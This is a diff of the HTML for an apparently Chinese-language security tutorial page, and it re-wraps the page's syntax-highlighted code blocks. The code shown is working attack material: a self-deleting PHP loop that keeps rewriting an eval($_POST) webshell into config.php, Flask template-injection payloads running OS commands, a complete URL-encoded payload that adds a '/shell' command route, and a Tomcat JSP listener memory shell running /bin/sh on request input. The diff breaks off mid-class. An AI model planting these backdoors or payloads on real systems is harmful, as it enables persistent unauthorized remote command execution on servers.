@@ -174,17 +174,17 @@
 </span><span class="lnt">10
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
-  <span class="nx">set_time_limit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
-  <span class="nx">ignore_user_abort</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
-  <span class="nx">unlink</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
-  <span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
-  	<span class="nv">$content</span> <span class="o">=</span> <span class="s1">&#39;&lt;?php @eval($_POST[&#34;zzz&#34;]) ?&gt;&#39;</span><span class="p">;</span>
-  	<span class="nx">file_put_contents</span><span class="p">(</span><span class="s2">&#34;config.php&#34;</span><span class="p">,</span> <span class="nv">$content</span><span class="p">);</span>
-  	<span class="nx">usleep</span><span class="p">(</span><span class="mi">10000</span><span class="p">);</span>
-  <span class="p">}</span>
-<span class="cp">?&gt;</span><span class="err">
-</span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">set_time_limit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">ignore_user_abort</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">unlink</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  	<span class="nv">$content</span> <span class="o">=</span> <span class="s1">&#39;&lt;?php @eval($_POST[&#34;zzz&#34;]) ?&gt;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  	<span class="nx">file_put_contents</span><span class="p">(</span><span class="s2">&#34;config.php&#34;</span><span class="p">,</span> <span class="nv">$content</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  	<span class="nx">usleep</span><span class="p">(</span><span class="mi">10000</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
 </div>
 </div><ul>
 <li><code>ignore_user_abort</code>：函数设置与客户机断开是否会终止脚本的执行，如果设置为 true，则忽略与用户的断开。</li>
@@ -229,10 +229,10 @@
 </span><span class="lnt">3
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="p">{{</span><span class="n">url_for</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;__builtins__&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">__import__</span><span class="p">(</span><span class="s1">&#39;os&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s1">&#39;ls&#39;</span><span class="p">)}}</span>
-
-<span class="p">{{</span><span class="n">url_for</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;__builtins__&#39;</span><span class="p">][</span><span class="s1">&#39;eval&#39;</span><span class="p">](</span><span class="s2">&#34;__import__(&#39;os&#39;).popen(&#39;whoami&#39;).read()&#34;</span><span class="p">)}}</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="p">{{</span><span class="n">url_for</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;__builtins__&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">__import__</span><span class="p">(</span><span class="s1">&#39;os&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s1">&#39;ls&#39;</span><span class="p">)}}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">{{</span><span class="n">url_for</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;__builtins__&#39;</span><span class="p">][</span><span class="s1">&#39;eval&#39;</span><span class="p">](</span><span class="s2">&#34;__import__(&#39;os&#39;).popen(&#39;whoami&#39;).read()&#34;</span><span class="p">)}}</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h3 id="22-实现">2.2 实现</h3>
 <p>以下面的 Demo 代码为例：</p>
@@ -262,29 +262,29 @@
 </span><span class="lnt">22
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">request</span>
-<span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">render_template_string</span>
-<span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
-
-<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">)</span>
-<span class="k">def</span> <span class="nf">hello_world</span><span class="p">():</span>
-    <span class="k">return</span> <span class="s1">&#39;Hello World&#39;</span>
-
-
-<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/test&#39;</span><span class="p">,</span><span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span> <span class="s1">&#39;POST&#39;</span><span class="p">])</span>
-<span class="k">def</span> <span class="nf">test</span><span class="p">():</span>
-    <span class="n">template</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;
-</span><span class="s1">        &lt;div class=&#34;center-content error&#34;&gt;
-</span><span class="s1">        &lt;h1&gt;Oops! That page doesn&#39;t exist.&lt;/h1&gt;
-</span><span class="s1">        &lt;h3&gt;</span><span class="si">%s</span><span class="s1">&lt;/h3&gt;
-</span><span class="s1">        &lt;/div&gt;
-</span><span class="s1">    &#39;&#39;&#39;</span> <span class="o">%</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">values</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;param&#39;</span><span class="p">))</span>
-
-    <span class="k">return</span> <span class="n">render_template_string</span><span class="p">(</span><span class="n">template</span><span class="p">)</span>
-
-<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
-    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">port</span><span class="o">=</span><span class="mi">8000</span><span class="p">)</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">request</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">render_template_string</span>
+</span></span><span class="line"><span class="cl"><span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">hello_world</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="s1">&#39;Hello World&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/test&#39;</span><span class="p">,</span><span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span> <span class="s1">&#39;POST&#39;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">test</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">template</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1">        &lt;div class=&#34;center-content error&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">        &lt;h1&gt;Oops! That page doesn&#39;t exist.&lt;/h1&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">        &lt;h3&gt;</span><span class="si">%s</span><span class="s1">&lt;/h3&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">        &lt;/div&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">    &#39;&#39;&#39;</span> <span class="o">%</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">values</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;param&#39;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">render_template_string</span><span class="p">(</span><span class="n">template</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">port</span><span class="o">=</span><span class="mi">8000</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>将 payload 拆解开：</p>
 <div class="highlight"><div class="chroma">
@@ -303,19 +303,19 @@
 </span><span class="lnt">12
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="n">url_for</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;__builtins__&#39;</span><span class="p">][</span><span class="s1">&#39;eval&#39;</span><span class="p">](</span>
-	<span class="s2">&#34;app.add_url_rule(</span>
-		<span class="s1">&#39;/shell&#39;</span><span class="p">,</span> 
-		<span class="s1">&#39;shell&#39;</span><span class="p">,</span> 
-		<span class="k">lambda</span> <span class="p">:</span><span class="nb">__import__</span><span class="p">(</span><span class="s1">&#39;os&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="n">_request_ctx_stack</span><span class="o">.</span><span class="n">top</span><span class="o">.</span><span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;cmd&#39;</span><span class="p">,</span> <span class="s1">&#39;whoami&#39;</span><span class="p">))</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
-		<span class="p">)</span>
-	<span class="s2">&#34;,</span>
-	<span class="p">{</span>
-		<span class="s1">&#39;_request_ctx_stack&#39;</span><span class="p">:</span><span class="n">url_for</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;_request_ctx_stack&#39;</span><span class="p">],</span>
-		<span class="s1">&#39;app&#39;</span><span class="p">:</span><span class="n">url_for</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;current_app&#39;</span><span class="p">]</span>
-	<span class="p">}</span>
-<span class="p">)</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">url_for</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;__builtins__&#39;</span><span class="p">][</span><span class="s1">&#39;eval&#39;</span><span class="p">](</span>
+</span></span><span class="line"><span class="cl">	<span class="s2">&#34;app.add_url_rule(</span>
+</span></span><span class="line"><span class="cl">		<span class="s1">&#39;/shell&#39;</span><span class="p">,</span> 
+</span></span><span class="line"><span class="cl">		<span class="s1">&#39;shell&#39;</span><span class="p">,</span> 
+</span></span><span class="line"><span class="cl">		<span class="k">lambda</span> <span class="p">:</span><span class="nb">__import__</span><span class="p">(</span><span class="s1">&#39;os&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="n">_request_ctx_stack</span><span class="o">.</span><span class="n">top</span><span class="o">.</span><span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;cmd&#39;</span><span class="p">,</span> <span class="s1">&#39;whoami&#39;</span><span class="p">))</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">		<span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="s2">&#34;,</span>
+</span></span><span class="line"><span class="cl">	<span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="s1">&#39;_request_ctx_stack&#39;</span><span class="p">:</span><span class="n">url_for</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;_request_ctx_stack&#39;</span><span class="p">],</span>
+</span></span><span class="line"><span class="cl">		<span class="s1">&#39;app&#39;</span><span class="p">:</span><span class="n">url_for</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;current_app&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>lambda 即匿名函数，payload 中 <code>add_url_rule()</code> 函数的第三个参数定义了一个 lambda 匿名函数，其中通过 os 库的 popen() 函数执行从 Web 请求中获取的 <code>cmd</code> 参数值并返回结果，其中该参数值默认为 <code>whoami</code>。</p>
 <p>eval() 方法的语法：</p>
@@ -324,8 +324,8 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="nb">eval</span><span class="p">(</span><span class="n">expression</span><span class="p">[,</span> <span class="nb">globals</span><span class="p">[,</span> <span class="nb">locals</span><span class="p">]])</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="nb">eval</span><span class="p">(</span><span class="n">expression</span><span class="p">[,</span> <span class="nb">globals</span><span class="p">[,</span> <span class="nb">locals</span><span class="p">]])</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>globals - 变量作用域，全局命名空间，如果被提供，则必须是一个字典对象。指定全局变量。</p>
 <p>最终的 URL：</p>
@@ -334,8 +334,8 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">http://IP:8000/param?param={{url_for.__globals__[%27__builtins__%27][%27eval%27](%22app.add_url_rule(%27/shell%27,%20%27shell%27,%20lambda%20:__import__(%27os%27).popen(_request_ctx_stack.top.request.args.get(%27cmd%27,%20%27whoami%27)).read())%22,{%27_request_ctx_stack%27:url_for.__globals__[%27_request_ctx_stack%27],%27app%27:url_for.__globals__[%27current_app%27]})}}
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://IP:8000/param?param={{url_for.__globals__[%27__builtins__%27][%27eval%27](%22app.add_url_rule(%27/shell%27,%20%27shell%27,%20lambda%20:__import__(%27os%27).popen(_request_ctx_stack.top.request.args.get(%27cmd%27,%20%27whoami%27)).read())%22,{%27_request_ctx_stack%27:url_for.__globals__[%27_request_ctx_stack%27],%27app%27:url_for.__globals__[%27current_app%27]})}}
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p><img
         class="lazyload"
@@ -509,62 +509,62 @@
 </span><span class="lnt">55
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="o">&lt;%</span><span class="err">@</span> <span class="n">page</span> <span class="n">import</span><span class="o">=</span><span class="s">&#34;org.apache.catalina.core.StandardContext&#34;</span> <span class="o">%&gt;</span>
-<span class="o">&lt;%</span><span class="err">@</span> <span class="n">page</span> <span class="n">import</span><span class="o">=</span><span class="s">&#34;org.apache.catalina.core.ApplicationContext&#34;</span> <span class="o">%&gt;</span>
-<span class="o">&lt;%</span><span class="err">@</span> <span class="n">page</span> <span class="n">import</span><span class="o">=</span><span class="s">&#34;java.lang.reflect.Field&#34;</span> <span class="o">%&gt;</span>
-<span class="o">&lt;%</span><span class="err">@</span> <span class="n">page</span> <span class="n">import</span><span class="o">=</span><span class="s">&#34;java.util.*,javax.crypto.*,javax.crypto.spec.*&#34;</span><span class="o">%&gt;</span>
-<span class="o">&lt;%</span><span class="err">@</span> <span class="n">page</span> <span class="n">import</span><span class="o">=</span><span class="s">&#34;org.apache.jasper.tagplugins.jstl.core.Out&#34;</span> <span class="o">%&gt;</span>
-<span class="o">&lt;%</span><span class="err">@</span> <span class="n">page</span> <span class="n">import</span><span class="o">=</span><span class="s">&#34;java.io.IOException&#34;</span> <span class="o">%&gt;</span>
-<span class="o">&lt;%</span><span class="err">@</span> <span class="n">page</span> <span class="n">import</span><span class="o">=</span><span class="s">&#34;javax.servlet.annotation.WebServlet&#34;</span> <span class="o">%&gt;</span>
-<span class="o">&lt;%</span><span class="err">@</span> <span class="n">page</span> <span class="n">import</span><span class="o">=</span><span class="s">&#34;java.io.InputStreamReader&#34;</span> <span class="o">%&gt;</span>
-<span class="o">&lt;%</span><span class="err">@</span> <span class="n">page</span> <span class="n">import</span><span class="o">=</span><span class="s">&#34;java.io.BufferedReader&#34;</span> <span class="o">%&gt;</span>
-<span class="o">&lt;%</span>
-     <span class="n">Object</span> <span class="n">obj</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getServletContext</span><span class="o">();</span>
-     <span class="n">Field</span> <span class="n">field</span> <span class="o">=</span> <span class="n">obj</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;context&#34;</span><span class="o">);</span>
-     <span class="n">field</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
-     <span class="n">ApplicationContext</span> <span class="n">applicationContext</span> <span class="o">=</span> <span class="o">(</span><span class="n">ApplicationContext</span><span class="o">)</span> <span class="n">field</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">obj</span><span class="o">);</span>
-     <span class="n">field</span> <span class="o">=</span> <span class="n">applicationContext</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;context&#34;</span><span class="o">);</span>
-     <span class="n">field</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
-     <span class="n">StandardContext</span> <span class="n">standardContext</span> <span class="o">=</span> <span class="o">(</span><span class="n">StandardContext</span><span class="o">)</span> <span class="n">field</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">applicationContext</span><span class="o">);</span>
-     <span class="n">ListenH</span> <span class="n">listenH</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ListenH</span><span class="o">(</span><span class="n">request</span><span class="o">,</span> <span class="n">response</span><span class="o">);</span>
-    <span class="n">standardContext</span><span class="o">.</span><span class="na">addApplicationEventListener</span><span class="o">(</span><span class="n">listenH</span><span class="o">);</span>
-    <span class="n">out</span><span class="o">.</span><span class="na">print</span><span class="o">(</span><span class="s">&#34;test&#34;</span><span class="o">);</span>
-<span class="o">%&gt;</span>
-<span class="o">&lt;%!</span>
-    <span class="kd">public</span> <span class="kd">class</span> <span class="nc">ListenH</span> <span class="kd">implements</span> <span class="n">ServletRequestListener</span> <span class="o">{</span>
-        <span class="kd">public</span> <span class="n">ServletResponse</span> <span class="n">response</span><span class="o">;</span>
-        <span class="kd">public</span> <span class="n">ServletRequest</span> <span class="n">request</span><span class="o">;</span>
-
-        <span class="n">ListenH</span><span class="o">(</span><span class="n">ServletRequest</span> <span class="n">request</span><span class="o">,</span> <span class="n">ServletResponse</span> <span class="n">response</span><span class="o">)</span> <span class="o">{</span>
-            <span class="k">this</span><span class="o">.</span><span class="na">request</span> <span class="o">=</span> <span class="n">request</span><span class="o">;</span>
-            <span class="k">this</span><span class="o">.</span><span class="na">response</span> <span class="o">=</span> <span class="n">response</span><span class="o">;</span>
-        <span class="o">}</span>
-
-        <span class="kd">public</span> <span class="kt">void</span> <span class="nf">requestDestroyed</span><span class="o">(</span><span class="n">ServletRequestEvent</span> <span class="n">servletRequestEvent</span><span class="o">)</span> <span class="o">{</span>
-        <span class="o">}</span>
-
-        <span class="kd">public</span> <span class="kt">void</span> <span class="nf">requestInitialized</span><span class="o">(</span><span class="n">ServletRequestEvent</span> <span class="n">servletRequestEvent</span><span class="o">)</span> <span class="o">{</span>
-            <span class="n">String</span> <span class="n">cmder</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">&#34;cmd&#34;</span><span class="o">);</span>
-            <span class="n">String</span><span class="o">[]</span> <span class="n">cmd</span> <span class="o">=</span> <span class="k">new</span> <span class="n">String</span><span class="o">[]{</span><span class="s">&#34;/bin/sh&#34;</span><span class="o">,</span> <span class="s">&#34;-c&#34;</span><span class="o">,</span> <span class="n">cmder</span><span class="o">};</span>
-            <span class="k">try</span> <span class="o">{</span>
-                <span class="n">Process</span> <span class="n">ps</span> <span class="o">=</span> <span class="n">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="n">cmd</span><span class="o">);</span>
-                <span class="n">BufferedReader</span> <span class="n">br</span> <span class="o">=</span> <span class="k">new</span> <span class="n">BufferedReader</span><span class="o">(</span><span class="k">new</span> <span class="n">InputStreamReader</span><span class="o">(</span><span class="n">ps</span><span class="o">.</span><span class="na">getInputStream</span><span class="o">()));</span>
-                <span class="n">StringBuffer</span> <span class="n">sb</span> <span class="o">=</span> <span class="k">new</span> <span class="n">StringBuffer</span><span class="o">();</span>
-                <span class="n">String</span> <span class="n">line</span><span class="o">;</span>
-                <span class="k">while</span> <span class="o">((</span><span class="n">line</span> <span class="o">=</span> <span class="n">br</span><span class="o">.</span><span class="na">readLine</span><span class="o">())</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
-                    <span class="c1">//执行结果加上回车
-</span><span class="c1"></span>                    <span class="n">sb</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="n">line</span><span class="o">).</span><span class="na">append</span><span class="o">(</span><span class="s">&#34;&lt;br&gt;&#34;</span><span class="o">);</span>
-                <span class="o">}</span>
-                <span class="n">String</span> <span class="n">result</span> <span class="o">=</span> <span class="n">sb</span><span class="o">.</span><span class="na">toString</span><span class="o">();</span>
-                <span class="k">this</span><span class="o">.</span><span class="na">response</span><span class="o">.</span><span class="na">getWriter</span><span class="o">().</span><span class="na">write</span><span class="o">(</span><span class="n">result</span><span class="o">);</span>
-            <span class="o">}</span><span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">){</span>
-                <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&#34;error &#34;</span><span class="o">);</span>
-            <span class="o">}</span>
-
-        <span class="o">}</span>
-    <span class="o">}</span>
-<span class="o">%&gt;</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="o">&lt;%</span><span class="err">@</span> <span class="n">page</span> <span class="n">import</span><span class="o">=</span><span class="s">&#34;org.apache.catalina.core.StandardContext&#34;</span> <span class="o">%&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;%</span><span class="err">@</span> <span class="n">page</span> <span class="n">import</span><span class="o">=</span><span class="s">&#34;org.apache.catalina.core.ApplicationContext&#34;</span> <span class="o">%&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;%</span><span class="err">@</span> <span class="n">page</span> <span class="n">import</span><span class="o">=</span><span class="s">&#34;java.lang.reflect.Field&#34;</span> <span class="o">%&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;%</span><span class="err">@</span> <span class="n">page</span> <span class="n">import</span><span class="o">=</span><span class="s">&#34;java.util.*,javax.crypto.*,javax.crypto.spec.*&#34;</span><span class="o">%&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;%</span><span class="err">@</span> <span class="n">page</span> <span class="n">import</span><span class="o">=</span><span class="s">&#34;org.apache.jasper.tagplugins.jstl.core.Out&#34;</span> <span class="o">%&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;%</span><span class="err">@</span> <span class="n">page</span> <span class="n">import</span><span class="o">=</span><span class="s">&#34;java.io.IOException&#34;</span> <span class="o">%&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;%</span><span class="err">@</span> <span class="n">page</span> <span class="n">import</span><span class="o">=</span><span class="s">&#34;javax.servlet.annotation.WebServlet&#34;</span> <span class="o">%&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;%</span><span class="err">@</span> <span class="n">page</span> <span class="n">import</span><span class="o">=</span><span class="s">&#34;java.io.InputStreamReader&#34;</span> <span class="o">%&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;%</span><span class="err">@</span> <span class="n">page</span> <span class="n">import</span><span class="o">=</span><span class="s">&#34;java.io.BufferedReader&#34;</span> <span class="o">%&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;%</span>
+</span></span><span class="line"><span class="cl">     <span class="n">Object</span> <span class="n">obj</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getServletContext</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">     <span class="n">Field</span> <span class="n">field</span> <span class="o">=</span> <span class="n">obj</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;context&#34;</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">     <span class="n">field</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">     <span class="n">ApplicationContext</span> <span class="n">applicationContext</span> <span class="o">=</span> <span class="o">(</span><span class="n">ApplicationContext</span><span class="o">)</span> <span class="n">field</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">obj</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">     <span class="n">field</span> <span class="o">=</span> <span class="n">applicationContext</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;context&#34;</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">     <span class="n">field</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">     <span class="n">StandardContext</span> <span class="n">standardContext</span> <span class="o">=</span> <span class="o">(</span><span class="n">StandardContext</span><span class="o">)</span> <span class="n">field</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">applicationContext</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">     <span class="n">ListenH</span> <span class="n">listenH</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ListenH</span><span class="o">(</span><span class="n">request</span><span class="o">,</span> <span class="n">response</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">standardContext</span><span class="o">.</span><span class="na">addApplicationEventListener</span><span class="o">(</span><span class="n">listenH</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">out</span><span class="o">.</span><span class="na">print</span><span class="o">(</span><span class="s">&#34;test&#34;</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl"><span class="o">%&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;%!</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">class</span> <span class="nc">ListenH</span> <span class="kd">implements</span> <span class="n">ServletRequestListener</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="kd">public</span> <span class="n">ServletResponse</span> <span class="n">response</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">        <span class="kd">public</span> <span class="n">ServletRequest</span> <span class="n">request</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">ListenH</span><span class="o">(</span><span class="n">ServletRequest</span> <span class="n">request</span><span class="o">,</span> <span class="n">ServletResponse</span> <span class="n">response</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">this</span><span class="o">.</span><span class="na">request</span> <span class="o">=</span> <span class="n">request</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">            <span class="k">this</span><span class="o">.</span><span class="na">response</span> <span class="o">=</span> <span class="n">response</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="kd">public</span> <span class="kt">void</span> <span class="nf">requestDestroyed</span><span class="o">(</span><span class="n">ServletRequestEvent</span> <span class="n">servletRequestEvent</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span>
+</span></span><span class="line"><span class="cl">
